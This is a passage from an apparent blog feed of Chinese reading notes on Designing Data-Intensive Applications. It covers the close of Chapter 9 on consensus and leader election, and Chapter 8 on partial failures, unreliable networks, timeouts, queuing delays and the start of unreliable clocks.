<li>线性一致性的 CAS 寄存器 寄存器需要基于当前值是否等于操作给出的参数，原子地 &nbsp;<strong>决定</strong>&nbsp; 是否设置新值。</li>
<li>原子事务提交 数据库必须 &nbsp;<strong>决定</strong>&nbsp; 是否提交或中止分布式事务。</li>
<li>全序广播 消息系统必须 &nbsp;<strong>决定</strong>&nbsp; 传递消息的顺序。</li>
<li>锁和租约 当几个客户端争抢锁或租约时，由锁来 &nbsp;<strong>决定</strong>&nbsp; 哪个客户端成功获得锁。</li>
<li>成员 / 协调服务 给定某种故障检测器（例如超时），系统必须 &nbsp;<strong>决定</strong>&nbsp; 哪些节点活着，哪些节点因为会话超时需要被宣告死亡。</li>
<li>唯一性约束 当多个事务同时尝试使用相同的键创建冲突记录时，约束必须 &nbsp;<strong>决定</strong>&nbsp; 哪一个被允许，哪些因为违反约束而失败。</li>
</ul>
<p>如果你只有一个节点，或者你愿意将决策的权能分配给单个节点，所有这些事都很简单。这就是在单领导者数据库中发生的事情：所有决策权归属于领导者，这就是为什么这样的数据库能够提供线性一致的操作，唯一性约束，完全有序的复制日志，以及更多。</p>
<p>但如果该领导者失效，或者如果网络中断导致领导者不可达，这样的系统就无法取得任何进展。应对这种情况可以有三种方法：</p>
<ol type="1">
<li>等待领导者恢复，接受系统将在这段时间阻塞的事实。许多 XA/JTA 事务协调者选择这个选项。这种方法并不能完全达成共识，因为它不能满足 &nbsp;<strong>终止</strong>&nbsp; 属性的要求：如果领导者续命失败，系统可能会永久阻塞。</li>
<li>人工故障切换，让人类选择一个新的领导者节点，并重新配置系统使之生效，许多关系型数据库都采用这种方方式。这是一种来自 “天意” 的共识 —— 由计算机系统之外的运维人员做出决定。故障切换的速度受到人类行动速度的限制，通常要比计算机慢（得多）。</li>
<li><mark style="background: #BBFABBA6;">使用算法自动选择一个新的领导者</mark>。这种方法需要一种共识算法，使用成熟的算法来正确处理恶劣的网络条件是明智之举。</li>
</ol>
<p>尽管单领导者数据库可以提供线性一致性，且无需对每个写操作都执行共识算法，但<mark style="background: #BBFABBA6;">共识对于保持及变更领导权仍然是必须的</mark>。因此从某种意义上说，使用单个领导者不过是 “缓兵之计”：共识仍然是需要的，只是在另一个地方，而且没那么频繁。好消息是，容错的共识算法与容错的共识系统是存在的，我们在本章中简要地讨论了它们。</p>
<p>像 ZooKeeper 这样的工具为应用提供了 “外包” 的共识、故障检测和成员服务。它们扮演了重要的角色，虽说使用不易，但总比自己去开发一个能经受 &nbsp;<a href="http://ddia.vonng.com/#/ch8">第八章</a>&nbsp; 中所有问题考验的算法要好得多。如果你发现自己想要解决的问题可以归结为共识，并且希望它能容错，使用一个类似 ZooKeeper 的东西是明智之举。</p>
<p>尽管如此，<mark style="background: #FFF3A3A6;">并不是所有系统都需要共识：例如，无领导者复制和多领导者复制系统通常不会使用全局的共识</mark>。这些系统中出现的冲突（请参阅 “<a href="http://ddia.vonng.com/#/ch5?id=%e5%a4%84%e7%90%86%e5%86%99%e5%85%a5%e5%86%b2%e7%aa%81">处理写入冲突</a>”）正是不同领导者之间没有达成共识的结果，但这也许并没有关系：也许我们只是需要接受没有线性一致性的事实，并学会更好地与具有分支与合并版本历史的数据打交道。</p>
<p>本章引用了大量关于分布式系统理论的研究。虽然理论论文和证明并不总是容易理解，有时也会做出不切实际的假设，但它们对于指导这一领域的实践有着极其重要的价值：它们帮助我们推理什么可以做，什么不可以做，帮助我们找到反直觉的分布式系统缺陷。如果你有时间，这些参考资料值得探索。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ddia.qtmuniao.com/#/ch09">第九章：一致性和共识协议 (qtmuniao.com)</a></li>
<li><a href="http://ddia.vonng.com/#/ch9">第九章：一致性与共识 (vonng.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>共识</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第八章：分布式系统中的麻烦</title>
    <url>/blog/2024/05/29/DDIA-Note-8/</url>
    <content><![CDATA[<p>分布式系统中，任何可能出错的事情都会出错。不可靠的网络、不同步的时钟，这些麻烦使得分布式系统的软件需要处理更多棘手的问题。本章讨论了这些问题和他们能够避免的程度。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>最近几章讨论了系统如何处理错误。例如，<strong>副本故障切换</strong>，<strong>复制延迟</strong>和事务。尽管已经讨论了很多错误，但之前几章仍然过于乐观。现实更加黑暗。本章将悲观主义最大化，假设任何可能出错的东西<strong>都会</strong>出错。</p>
<ul>
<li>使用分布式系统与在单机上编写软件有着根本的区别：有许多新的情况会使事情出错</li>
</ul>
<p>本章对分布式系统中可能出现的问题进行总结，包含两大类：</p>
<ul>
<li>网络</li>
<li>时钟和时序</li>
</ul>
<p>并讨论他们可以避免的程度。</p>
<h2 id="故障与部分失效"><strong>故障与部分失效</strong></h2>
<p>单个计算机上的程序通常会以一种相当可预测的方式运行：要么工作，要么不工作。</p>
<ul>
<li>软件是<mark style="background: #FFF3A3A6;">确定性的</mark>：当硬件正常工作时，相同的操作总是产生相同的结果</li>
<li>如果存在硬件问题（例如，内存损坏或连接器松动），其后果通常是整个系统故障（例如，内核恐慌，“蓝屏死机”，启动失败）</li>
</ul>
<p>这是计算机设计中的一个慎重的选择：如果发生内部错误，<mark style="background: #BBFABBA6;">宁愿电脑完全崩溃，也不要返回错误的结果</mark>，因为<strong>错误的结果很难处理</strong>。</p>
<p>当你编写运行在多台计算机上的软件时，情况有本质上的区别。在分布式系统中，我们不再处于理想化的系统模型中，我们别无选择，只能面对现实世界的混乱现实。而在现实世界中，各种各样的事情都可能会出现问题：</p>
<ul>
<li><strong>部分失效（partial failure）</strong>：在分布式系统中，尽管系统的其他部分工作正常，但系统的某些部分可能会以某种不可预知的方式被破坏。部分失效是<mark style="background: #FFF3A3A6;">不确定的（nonderterministic）</mark>。
<ul>
<li>你甚至不知道是否成功了，因为消息通过网络传播的时间也是不确定的</li>
</ul></li>
</ul>
<p>这种不确定性和部分失效的可能性，使得分布式系统难以工作。</p>
<h3 id="云计算与超级计算机"><strong>云计算与超级计算机</strong></h3>
<p>构建大型计算系统有一系列哲学：</p>
<ul>
<li>一个极端是高性能计算（HPC）领域。具有数千个 CPU 的超级计算机通常用于计算密集型科学计算任务，如天气预报或分子动力学（模拟原子和分子的运动）。</li>
<li>另一个极端是 &nbsp;<strong>云计算（cloud computing）</strong>，云计算并不是一个良好定义的概念【6】，但通常与多租户数据中心，连接 IP 网络（通常是以太网）的商用计算机，弹性 / 按需资源分配以及计量计费等相关联。</li>
<li>传统企业数据中心位于这两个极端之间。</li>
</ul>
<p>不同的哲学会导致不同的故障处理方式。在超级计算机中：</p>
<ul>
<li>作业通常会不时地将计算状态存盘到持久存储中。如果一个节点出现故障，通常的解决方案是简单地停止整个集群的工作负载。故障节点修复后，计算从上一个检查点重新开始</li>
<li>超级计算机更像是一个单节点计算机而不是分布式系统：通过<mark style="background: #FFF3A3A6;">让部分失败升级为完全失败来处理部分失败</mark> —— 如果系统的任何部分发生故障，只是让所有的东西都崩溃</li>
</ul>
<p>本书中的重点在于实现互联网服务的系统，这些系统通常与超级计算机看起来有很大不同：</p>
<ul>
<li>在线离线
<ul>
<li>互联网应用程序通常都是 &nbsp;<strong>在线（online）</strong>&nbsp; 的，需要能够随时以低延迟服务用户。使服务不可用（例如，停止集群以进行修复）是不可接受的</li>
<li>相比之下，像天气模拟这样的离线（批处理）工作可以停止并重新启动，影响相当小</li>
</ul></li>
<li>硬件与成本
<ul>
<li>超级计算机通常由专用硬件构建而成，每个节点相当可靠，节点通过共享内存和 &nbsp;<strong>远程直接内存访问（RDMA）</strong>&nbsp; 进行通信。</li>
<li>云服务中的节点是由商用机器构建而成的，由于规模经济，可以以较低的成本提供相同的性能，而且具有较高的故障率。</li>
</ul></li>
<li>组网方式不同
<ul>
<li>大型数据中心网络通常基于 IP 和以太网，以 CLOS 拓扑排列，以提供更高的对分（bisection）带宽。</li>
<li>超级计算机通常使用专门的网络拓扑结构，例如多维网格和 Torus 网络 ，这为具有已知通信模式的 HPC 工作负载提供了更好的性能。</li>
</ul></li>
<li>故障常态化
<ul>
<li>系统越大，就越有可能存在坏掉的组件。随着时间的推移，坏掉的东西得到修复，新的东西又坏掉。</li>
<li>但是在一个有成千上万个节点的系统中，有理由认为总是有一些东西是坏掉的。当错误处理的策略只由简单放弃组成时，一个大的系统最终会花费大量时间从错误中恢复，而不是做有用的工作。</li>
</ul></li>
<li>容错
<ul>
<li>如果系统可以容忍发生故障的节点，并继续保持整体工作状态，那么这对于运营和维护非常有用：例如，可以执行滚动升级，一次重新启动一个节点，同时继续给用户提供不中断的服务。在云环境中，如果一台虚拟机运行不佳，可以杀死它并请求一台新的虚拟机（希望新的虚拟机速度更快）。</li>
</ul></li>
<li>通信
<ul>
<li>互联网软件通常在地理位置上分散部署，保持数据在地理位置上接近用户以减少访问延迟，通信很可能通过互联网进行，与本地网络相比，通信速度缓慢且不可靠。</li>
<li>超级计算机通常假设它们的所有节点都靠近在一起。</li>
</ul></li>
</ul>
<p>如果要使分布式系统工作，就必须接受部分故障的可能性，并在软件中建立容错机制。换句话说，需要<strong>从不可靠的组件构建一个可靠的系统</strong>（没有完美的可靠性，我们需要理解可以实际承诺的极限）。</p>
<ul>
<li>即使在只有少数节点的小型系统中，考虑部分故障也是很重要的。<mark style="background: #FFF3A3A6;">故障处理必须是软件设计的一部分</mark>。</li>
<li>简单地假设缺陷很罕见，并希望始终保持最好的状况是不明智的。考虑一系列可能的错误（甚至是不太可能的错误），并在测试环境中人为地创建这些情况来查看会发生什么是非常重要的。在分布式系统中，怀疑，悲观和偏执狂是值得的。</li>
</ul>
<blockquote>
<p>从不可靠的组件构建可靠的系统</p>
<p><strong>你可能想知道这是否有意义 —— 直观地看来，系统只能像其最不可靠的组件（最薄弱的环节）一样可靠。事实并非如此：事实上，<mark style="background: #BBFABBA6;">从不太可靠的基础构建更可靠的系统是计算机领域的一个古老思想</mark>。例如：</strong></p>
<ul>
<li>纠错码允许数字数据在通信信道上准确传输，偶尔会出现一些错误，例如由于无线网络上的无线电干扰。</li>
<li><strong>互联网协议（Internet Protocol, IP）</strong>&nbsp; 不可靠：可能丢弃、延迟、重复或重排数据包。 传输控制协议（Transmission Control Protocol, TCP）在互联网协议（IP）之上提供了更可靠的传输层：它确保丢失的数据包被重新传输，消除重复，并且数据包被重新组装成它们被发送的顺序。</li>
</ul>
<p><strong>虽然这个系统可以比它的底层部分更可靠，但它的<mark style="background: #FFF3A3A6;">可靠性总是有限的</mark>。例如，纠错码可以处理少量的单比特错误，但是如果你的信号被干扰所淹没，那么通过信道可以得到多少数据，是有根本性的限制的。<mark style="background: #FFF3A3A6;"> TCP 可以隐藏数据包的丢失，重复和重新排序，但是它不能消除网络中的延迟。</mark></strong></p>
<p><strong>虽然更可靠的高级系统并不完美，但它仍然有用，因为它处理了一些棘手的低级错误，所以其余的错误通常更容易推理和处理。我们将在 “数据库的端到端原则” 中进一步探讨这个问题。</strong></p>
</blockquote>
<h2 id="不可靠的网络"><strong>不可靠的网络</strong></h2>
<p>本书中关注的分布式系统是<mark style="background: #FFF3A3A6;">无共享</mark>的系统，即一堆机器通过网络连接，只能通过网络通信。</p>
<ul>
<li>机器不能访问另一台机器的内存或磁盘（除了通过网络向服务器发出请求）。</li>
<li><strong>无共享</strong>&nbsp; 并不是构建系统的唯一方式，但它已经成为<mark style="background: #BBFABBA6;">构建互联网服务的主要方式</mark>，其原因如下：相对便宜，因为它不需要特殊的硬件，可以利用商品化的云计算服务，通过跨多个地理分布的数据中心进行冗余可以实现高可靠性。</li>
</ul>
<p>互联网和数据中心（通常是以太网）中的大多数内部网络都是 &nbsp;<strong>异步分组网络（asynchronous packet networks）：</strong>节点可以向另一个节点发送消息（一个数据包），但是网络不能保证它什么时候到达，或者是否到达。如果发送请求并期待响应，则很多事情可能会出错（一些如 &nbsp; 图 8-1 所示）：</p>
<ol type="1">
<li>请求丢失：请求可能已经丢失（可能有人拔掉了网线）。</li>
<li>请求排队：请求可能正在排队，稍后将交付（也许网络或接收方过载）。</li>
<li>不可达：远程节点可能已经失效（可能是崩溃或关机）。</li>
<li>暂停：远程节点可能暂时停止了响应（例如长时间的垃圾回收暂停），但稍后会再次响应。</li>
<li>响应丢失：远程节点可能已经处理了请求，但是网络上的响应已经丢失（可能是网络交换机配置错误）。</li>
<li>响应延迟：远程节点可能已经处理了请求，但是响应已经被延迟，并且稍后将被传递（可能是网络或者你自己的机器过载）。 <img src="ch08-fig01.png"></li>
</ol>
<p>这些问题在异步网络中难以区分，发送方所拥有的唯一信息是，尚未收到响应。发送者甚至不能分辨数据包是否被发送：唯一的选择是让接收者发送响应消息，但这也可能会丢失或延迟。</p>
<p>处理这个问题的通常方法是<strong>超时（Timeout）</strong>：<mark style="background: #FFF3A3A6;">在一段时间之后放弃等待，并且认为响应不会到达</mark>。</p>
<ul>
<li>但是，当发生超时时，发送方仍不知道远程节点是否收到了请求（如果请求仍然在某个地方排队，那么即使发件人已经放弃了该请求，仍然可能会将其发送给收件人）</li>
</ul>
<h3 id="真实世界的网络故障"><strong>真实世界的网络故障</strong></h3>
<p>即使建设计算机网络已经有几十年的历史，人们仍没有找出使网络变得可靠的方法。</p>
<p>即使在公司运营的数据中心中，网络问题也可能出乎意料地普遍。</p>
<ul>
<li>在一家中型数据中心进行的一项研究发现，每个月大约有 12 个网络故障，其中一半断开一台机器，一半断开整个机架。</li>
<li>另一项研究测量了架顶式交换机，汇聚交换机和负载平衡器等组件的故障率。它发现添加冗余网络设备不会像您所希望的那样减少故障，因为它不能防范人为错误（例如，错误配置的交换机），这是造成中断的主要原因。</li>
</ul>
<p>诸如 EC2 之类的公有云服务因频繁的暂态网络故障而臭名昭着，管理良好的私有数据中心网络可能是更稳定的环境。尽管如此，没有人不受网络问题的困扰：</p>
<ul>
<li>例如，交换机软件升级过程中的一个问题可能会引发网络拓扑重构，在此期间网络数据包可能会延迟超过一分钟</li>
<li>鲨鱼可能咬住海底电缆并损坏它们</li>
<li>其他令人惊讶的故障，包括网络接口有时会丢弃所有入站数据包，但是成功发送出站数据包 ：网络链接在一个方向上工作，并不能保证它也在相反的方向工作。</li>
</ul>
<blockquote>
<p>网络分区</p>
<p>当网络的一部分由于网络故障而被切断时，有时称为<strong>网络分区（network partition）</strong>或<strong>网络断裂（netsplit）</strong>。在本书中，我们通常会坚持使用更一般的术语<strong>网络故障（network fault）</strong>，以避免与第 6 章讨论的存储系统的分区（分片）相混淆。</p>
</blockquote>
<p>即使网络故障在你的环境中非常罕见，故障可能发生的事实，意味着你的软件需要能够处理它们。<mark style="background: #FFF3A3A6;">无论何时通过网络进行通信，都可能会失败</mark>，这是无法避免的。</p>
<p>如果网络故障的错误处理没有定义与测试，武断地讲，各种错误可能都会发生：例如，即使网络恢复【20】，集群可能会发生<strong>死锁</strong>，永久无法为请求提供服务，甚至可能会删除所有的数据。如果软件被置于意料之外的情况下，它可能会做出出乎意料的事情。</p>
<p>处理网络故障并不意味着容忍它们：如果你的网络通常是相当可靠的，一个有效的方法可能是当你的网络遇到问题时，简单地向用户显示一条错误信息。但是，您确实需要知道您的软件如何应对网络问题，并确保系统能够从中恢复。有意识地触发网络问题并测试系统响应（这是 Chaos Monkey 背后的想法）。</p>
<h3 id="检测故障"><strong>检测故障</strong></h3>
<p>许多系统需要自动检测故障节点。例如：</p>
<ul>
<li>负载平衡器需要停止向已死亡的节点转发请求，即从<strong>移出轮询列表（out of rotation）</strong></li>
<li>在单主复制功能的分布式数据库中，如果主库失效，则需要将从库之一升级为新主库</li>
</ul>
<p>不幸的是，网络的不确定性使得<mark style="background: #FFF3A3A6;">很难判断一个节点是否工作</mark>。在某些特定的情况下，可能会收到一些反馈信息，明确告诉某些事情没有成功：</p>
<ul>
<li>如果报文可以到达运行节点的机器，但没有进程正在侦听目标端口（例如，因为进程崩溃），操作系统将通过发送 FIN 或 RST 来关闭并重用 TCP 连接。但是，如果节点在处理请求时发生崩溃，则无法知道远程节点实际处理了多少数据。</li>
<li>如果节点进程崩溃（或被管理员杀死），但节点的操作系统仍在运行，则脚本可以通知其他节点有关该崩溃的信息，以便另一个节点可以快速接管，而无需等待超时到期。例如，HBase。</li>
<li>如果有权访问数据中心网络交换机的管理界面，则可以查询它们以检测硬件级别的链路故障（例如，远程机器是否关闭电源）。</li>
<li>如果路由器确认尝试连接的 IP 地址不可用，则可能会使用 ICMP 目标不可达数据包回复您。但是，路由器不具备神奇的故障检测能力 —— 它受到与网络其他参与者相同的限制。</li>
</ul>
<p>关于远程节点关闭的快速反馈很有用，但是不能完全指望它。即使 TCP 确认已经传送了一个数据包，应用程序在处理之前可能已经崩溃。<mark style="background: #BBFABBA6;">如果想确保一个请求是成功的，需要应用程序本身的积极响应</mark>。</p>
<ul>
<li>个人理解：建设在传输层之上的应用层协议，关心的是应用程序是否收到消息并正确处理，而不只是报文是否成功到达。</li>
<li>这也可以用于回答，<mark style="background: #FFF3A3A6;">为什么 TCP 已经解决了丢包，应用层还是要担心消息丢失</mark>？如果 TCP 收到了响应并发送 ACK，但应用层还没来得及处理就宕机了。这种也算消息丢失，但 TCP 已经解决不了这种问题了。</li>
</ul>
<p>虽然有时对端出错，可以很快收到一个错误，但并不能指望在任何情况下都能很快得到错误回复 —— 可能过了一段时间我们仍然没有得到任何回复。因此，在应用代码里，<mark style="background: #FFF3A3A6;">必须设置一个<strong>合理的超时时限</strong>和重试次数</mark>。直到，你确认没有再重试的必要 —— 即不管远端节点是否存活，在重试几次后，都认为它不可用了（或者暂时不可用）。</p>
<h3 id="超时与无界延迟"><strong>超时与无界延迟</strong></h3>
<p>超时时间的设置应该设置为多少？</p>
<ul>
<li>不应太长：太长会导致问题检测不及时，用户可能长时间等待。</li>
<li>不应太短：太短可能误判，将短暂的网络延迟误判为节点下线，造成不必要的故障转移。
<ul>
<li>如果这个节点实际上是活着的，并且正在执行一些动作（例如，发送一封电子邮件），而另一个节点接管，那么这个动作可能会最终执行两次。</li>
<li>故障转移会给其他节点和网络带来额外的负担。如果系统已经处于高负荷状态，则过早宣告节点死亡会使问题更严重。</li>
<li>如果节点实际上没有死亡，只是由于过载导致其响应缓慢；这时将其负载转移到其他节点可能会导致 &nbsp;<strong>级联失效</strong>（ cascading failure）：在极端情况下，所有节点都宣告对方死亡，所有节点都将停止工作。</li>
</ul></li>
</ul>
<p>设有一个理想的系统：</p>
<ul>
<li>能够保证所有的网络<strong>通信延迟不超过 d</strong>：所有的网络包要么在 d 时间内送达对端、要么就会丢失，即不可能在超过 d 的时限后才到</li>
<li>应用层处理请求所需的最大时间为 r</li>
</ul>
<p>在这种情况下，你可以保证每个成功的请求在 &nbsp;2𝑑+r&nbsp; 时间内都能收到响应，如果你在此时间内没有收到响应，则知道网络或远程节点不工作。如果这是成立的，2𝑑+𝑟2d+r&nbsp; 会是一个合理的超时设置。</p>
<p>不幸的是，我们所使用的大多数系统都没有这些保证：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">异步网络具有无限的延迟</mark>：即尽可能快地传送数据包，但数据包到达可能需要的时间没有上限</li>
<li>大多数服务器实现并不能保证它们可以在一定的时间内处理请求</li>
</ul>
<p>对于故障检测，即使系统大部分时间快速运行也是不够的：如果你的超时时间很短，往返时间只需要一个瞬时尖峰就可以使系统失衡。</p>
<h4 id="网络拥塞和排队">网络拥塞和排队</h4>
<p>在驾驶汽车时，由于交通拥堵，道路交通网络的通行时间往往不尽相同。同样，计算机网络上数据包延迟的可变性通常是由于排队：</p>
<ul>
<li><mark style="background: #FFF3A3A6;">交换机</mark>：如果多个不同的节点同时尝试将数据包发送到同一目的地，则网络交换机必须将它们排队并将它们逐个送入目标网络链路（如 &nbsp; 图 8-2 所示）。在繁忙的网络链路上，数据包可能需要等待一段时间才能获得一个插槽（这称为网络拥塞）。如果传入的数据太多，交换机队列填满，<mark style="background: #FF5582A6;">数据包将被丢弃</mark>，因此需要重新发送数据包 - 即使网络运行良好。</li>
<li><mark style="background: #FFF3A3A6;">接收方缓冲区</mark>：当数据包到达目标机器时，如果所有 CPU 内核当前都处于繁忙状态，则来自网络的传入请求将<mark style="background: #FFF3A3A6;">被操作系统排队</mark>，直到应用程序准备好处理它为止。根据机器上的负载，这可能需要一段任意的时间。</li>
<li><mark style="background: #FFF3A3A6;">等待线程调度</mark>：在虚拟化环境中，正在运行的操作系统经常暂停几十毫秒，因为另一个虚拟机正在使用 CPU 内核。在这段时间内，虚拟机不能从网络中消耗任何数据，所以传入的数据被虚拟机监视器排队（缓冲），进一步增加了网络延迟的可变性。</li>
<li><mark style="background: #FFF3A3A6;">发送方缓冲区</mark>：TCP 执行 &nbsp;<strong>流量控制</strong>（flow control，也称为 &nbsp;<strong>拥塞避免</strong>，即 congestion avoidance，或 &nbsp;<strong>背压</strong>，即 backpressure），其中节点会限制自己的发送速率以避免网络链路或接收节点过载。这意味着甚至在数据进入网络之前，<mark style="background: #FFF3A3A6;">在发送者处就需要进行额外的排队</mark>。</li>
</ul>
<p><img src="ch08-fig02.png"></p>
<p>此外，TCP 中存在<strong>超时重传</strong>机制，虽然重传本身对应用层不可见，但是超时重传带来的延迟却是无法掩盖的。</p>
<blockquote>
<p>TCP 与 UDP</p>
<p><strong>一些对延迟敏感的应用程序，比如视频会议和 IP 语音（VoIP），使用了 UDP 而不是 TCP。这是在可靠性和和延迟变化之间的折衷：由于 UDP 不执行流量控制并且不重传丢失的分组，所以避免了网络延迟变化的一些原因（尽管它仍然易受切换队列和调度延迟的影响）。</strong></p>
<p><strong>在延迟数据毫无价值的情况下，UDP 是一个不错的选择。例如，在 VoIP 电话呼叫中，可能没有足够的时间重新发送丢失的数据包，并在扬声器上播放数据。在这种情况下，重发数据包没有意义 —— 应用程序必须使用静音填充丢失数据包的时隙（导致声音短暂中断），然后在数据流中继续。<mark style="background: #FFF3A3A6;">重试发生在人类层</mark>。 （“你能再说一遍吗？声音刚刚断了一会儿。“）</strong></p>
</blockquote>
<p>在公共云和多租户数据中心中，资源被许多客户共享：网络链接和交换机，甚至每个机器的网卡和 CPU（在虚拟机上运行时）。批处理工作负载（如 MapReduce）能够很容易使网络链接饱和。由于无法控制或了解其他客户对共享资源的使用情况，如果附近的某个人正在使用大量资源，则网络延迟可能会发生剧烈变化。</p>
<p>在这种环境下，你只能通过实验方式选择超时：在一段较长的时期内、在多台机器上测量网络往返时间的分布，以确定延迟的预期变化。然后，考虑到应用程序的特性，可以确定<mark style="background: #BBFABBA6;">&nbsp;<strong>故障检测延迟</strong>&nbsp; 与 &nbsp;<strong>过早超时风险</strong>&nbsp; 之间的适当折衷</mark>。</p>
<p>更好的一种做法是，<mark style="background: #BBFABBA6;">系统不是使用配置的常量超时时间，而是连续测量响应时间及其变化（抖动），并根据观察到的响应时间分布自动调整超时时间</mark>。这可以通过 Phi Accrual 故障检测器来完成，该检测器在例如 Akka 和 Cassandra 中使用。 TCP 的超时重传机制也是以类似的方式工作。</p>
<h4 id="同步网络与异步网络">同步网络与异步网络</h4>
<p>如果我们可以依靠网络来传递一些 &nbsp;<strong>最大延迟固定</strong>&nbsp; 的数据包，而不是丢弃数据包，那么分布式系统就会简单得多。为什么我们不能在硬件层面上解决这个问题，使网络可靠，使软件不必担心呢？</p>
<p>可以将数据中心网络与非常可靠的传统固定电话网络（非蜂窝，非 VoIP）进行比较：</p>
<ul>
<li>音频帧的延迟和丢失是非常罕见的</li>
<li>电话需要很低的端到端延迟，以及足够的带宽来传输你声音的音频采样数据</li>
</ul>
<p>在计算机网络中有类似的可靠性和可预测性不是很好吗？</p>
<p>当你通过电话网络拨打电话时，它会建立一个电路（circuit）：在两个呼叫者之间的整个路线上为呼叫分配一个固定的，有保证的带宽量。这个电路会保持至通话结束。例如，ISDN 网络以每秒 4000 帧的固定速率运行。呼叫建立时，每个帧内（每个方向）分配 16 位空间。因此，在通话期间，每一方都保证能够每 250 微秒发送一个精确的 16 位音频数据。</p>
<p>这种网络是同步的：即使数据经过多个路由器，也不会受到排队的影响，因为<mark style="background: #BBFABBA6;">呼叫的 16 位空间已经在网络的下一跳中保留了下来</mark>。而且由于没有排队，网络的最大端到端延迟是固定的。我们称之为 &nbsp;<strong>有限延迟（bounded delay）</strong>。</p>
<h5 id="我们不能简单地使网络延迟可预测吗">我们不能简单地使网络延迟可预测吗？</h5>
<p>电话网络中的电路与 TCP 连接有很大不同：</p>
<ul>
<li>电路是固定额度的预留带宽，在电路建立时没有其他人可以使用</li>
<li> TCP 连接的数据包 &nbsp;<strong>机会性地</strong>&nbsp; 使用任何可用的网络带宽。你可以给 TCP 一个可变大小的数据块，它会尽可能在最短的时间内传输它。 TCP 连接空闲时，不使用任何带宽。
<ul>
<li>如果 TCP keepalive 被启用，会有偶尔的 keepalive 数据包。</li>
</ul></li>
</ul>
<p>如果数据中心网络和互联网是电路交换网络，那么在建立电路时就可以建立一个受保证的最大往返时间。但是，它们并不是：</p>
<ul>
<li>以太网和 IP 是 &nbsp;<strong>分组交换协议</strong>。没有电路的概念，不得不忍受排队，及其导致的网络无限延迟。</li>
</ul>
<p>为什么数据中心网络和互联网使用分组交换？答案是，它们<mark style="background: #BBFABBA6;">针对 &nbsp;<strong>突发流量（bursty traffic）</strong>&nbsp; 进行了优化</mark>。</p>
<ul>
<li>电路适用于音频或视频通话，在通话期间需要每秒传送相当数量的比特。</li>
<li>请求网页，发送电子邮件或传输文件没有任何特定的带宽要求 —— 我们只是希望它尽快完成。</li>
</ul>
<p>如果想通过电路传输文件，得预测一个带宽分配</p>
<ul>
<li>如果猜的太低，传输速度会不必要的太慢，导致网络容量闲置</li>
<li>如果猜的太高，电路就无法建立（因为如果无法保证其带宽分配，网络不能建立电路）</li>
</ul>
<p>因此，<mark style="background: #FF5582A6;">将电路用于突发数据传输会浪费网络容量，并且使传输不必要的缓慢</mark>。相比之下，<mark style="background: #BBFABBA6;">TCP 动态调整数据传输速率以适应可用的网络容量</mark>。</p>
<p>已经有一些尝试去建立同时支持电路交换和分组交换的混合网络，比如 异步传输模式（Asynchronous Transfer Mode, ATM）。InfiniBand 有一些相似之处：它在链路层实现了端到端的流量控制，从而减少了在网络中排队的需要，尽管它仍然可能因链路拥塞而受到延迟。通过仔细使用 &nbsp;<strong>服务质量</strong>（quality of service， QoS，数据包的优先级和调度）和 &nbsp;<strong>准入控制</strong>（admission control，限速发送器），可以在分组网络上模拟电路交换，或提供统计上的 &nbsp;<strong>有限延迟</strong>。</p>
<p>但是，目前在多租户数据中心和公共云或通过互联网 进行通信时，此类服务质量尚未启用。当前部署的技术<mark style="background: #FFF3A3A6;">不允许我们对网络的延迟或可靠性作出任何保证</mark>：我们必须<mark style="background: #FF5582A6;">假设网络拥塞，排队和无限的延迟总是会发生</mark>。因此，超时时间没有 “正确” 的值 —— 它需要通过实验来确定。</p>
<ul>
<li>互联网服务提供商之间的对等协议和通过 &nbsp;<strong>BGP 网关协议（BGP）</strong>&nbsp; 建立的路由，与 IP 协议相比，更接近于电路交换。在这个级别上，可以购买专用带宽。但是，互联网路由在网络级别运行，而不是主机之间的单独连接，而且运行时间要长得多。</li>
</ul>
<blockquote>
<p>延迟和资源利用</p>
<p>更一般地说，可以将 &nbsp;<strong>延迟不稳定</strong>&nbsp; 视为 &nbsp;<strong>动态资源分配</strong>&nbsp; 的结果。</p>
<p>假设两台电话交换机之间有一条线路，可以同时进行 10,000 个呼叫。通过此线路切换的每个电路都占用其中一个呼叫插槽。因此，你可以将线路视为可由多达 10,000 个并发用户共享的资源。资源以静态方式分配：即使你现在是线路上唯一的呼叫，并且所有其他 9,999 个插槽都未使用，你的电路仍将分配与线路充分利用时相同的固定数量的带宽。</p>
<p>相比之下，互联网动态分享网络带宽。发送者互相推挤和争夺，以让他们的数据包尽可能快地通过网络，并且网络交换机决定从一个时刻到另一个时刻发送哪个分组（即，带宽分配）。这种方法有<mark style="background: #FF5582A6;">排队</mark>的缺点，但其优点是<mark style="background: #BBFABBA6;">它最大限度地利用了线路</mark>。线路固定成本，所以如果你更好地利用它，你通过线路发送的每个字节都会更便宜。</p>
<p>CPU 也会出现类似的情况：如果你在多个线程间动态共享每个 CPU 内核，则一个线程有时必须在操作系统的运行队列里等待，而另一个线程正在运行，这样每个线程都有可能被暂停一个不定的时间长度。但是，与为每个线程分配静态数量的 CPU 周期相比，这会更好地利用硬件。更好的硬件利用率也是使用虚拟机的重要动机。</p>
<p>如果资源是静态分配的（例如，专用硬件和专用带宽分配），则在某些环境中可以实现 &nbsp;<strong>延迟保证</strong>。但是，这是<mark style="background: #FF5582A6;">以降低利用率为代价</mark>的 —— 换句话说，它是更昂贵的。另一方面，动态资源分配的多租户提供了更好的利用率，所以它更便宜，但它具有可变延迟的缺点。</p>
<p><mark style="background: #BBFABBA6;">网络中的可变延迟不是一种自然规律，而只是成本 / 收益权衡的结果</mark>。</p>
</blockquote>
<h2 id="不可靠的时钟">不可靠的时钟</h2>
<p>时钟和时间很重要。应用程序以各种方式依赖于时钟来回答以下问题：</p>
<ol type="1">
<li>这个请求是否超时了？</li>
<li>这项服务的第 99 百分位响应时间是多少？</li>
<li>在过去五分钟内，该服务平均每秒处理多少个查询？</li>
<li>用户在我们的网站上花了多长时间？</li>
<li>这篇文章在何时发布？</li>
<li>在什么时间发送提醒邮件？</li>
<li>这个缓存条目何时到期？</li>
<li>日志文件中此错误消息的时间戳是什么？</li>
</ol>
<p>这些例子中：</p>
<ul>
<li>例 1-4 测量了 &nbsp;<strong>持续时间</strong>（durations），即两个时间点间的时间间隔</li>
